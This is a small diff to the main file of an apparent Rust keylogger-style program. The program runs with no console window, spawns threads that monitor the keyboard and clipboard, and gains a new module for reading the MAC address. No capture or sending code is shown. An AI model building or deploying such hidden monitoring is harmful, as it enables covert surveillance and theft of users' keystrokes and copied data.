@@ -1,6 +1,7 @@
 #![windows_subsystem = "windows"]
 
 mod clipboard;
+mod get_mac_addr;
 mod key_mapping;
 mod keyboard;
 mod logger;
@@ -45,6 +46,7 @@ pub fn main() {
             return;
         }
         let _ = ManuallyDrop::new(handle);
+
         let mut threads = Vec::new();
         threads.push(thread::spawn(|| keyboard::monitor_keyboard()));
         threads.push(thread::spawn(|| clipboard::monitor_clipboard()));
